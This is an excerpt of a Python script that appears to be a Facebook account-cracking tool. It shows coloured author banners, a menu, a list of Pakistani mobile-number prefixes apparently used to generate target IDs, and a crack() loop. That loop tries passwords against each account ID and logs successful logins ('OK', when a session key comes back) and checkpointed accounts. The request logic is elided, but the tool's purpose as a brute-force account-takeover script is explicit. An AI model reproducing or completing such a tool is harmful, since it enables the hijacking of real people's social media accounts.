...
sys.stdout.write('\x1b[1;35m\x1b]2;🫀🐒AQEEL AHMED 🙂💗 \x07')
...
\033[1;97m---------------------------------------------------
 \033[1;97m[\033[1;92m•\033[1;97m] Author   : Aqeel Ahmed
 \033[1;97m[\033[1;92m•\033[1;97m] Facebook : https://facebook.com/aqeelahmed
 \033[1;97m[\033[1;92m•\033[1;97m] GitHub   : https://github.com/aqeelahmed
...
def menu():
    ...
    if younisxyz in ['1','01']:
    	...
    	os.system("xdg-open https://www.facebook.com/profile.php?id=100088406914968");time.sleep(3);menu()
    else:
...
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0313, 0330, 0340 ")
...
def crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r{x}[AQEEL] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            if "session_key" in po:
                print(f"\r\033[1;92m [AQEEL-OK] {uid} | {pw}")
                ...
                print(f"\r{cpclr} [AQEEL-CP] {uid} | {pw}")
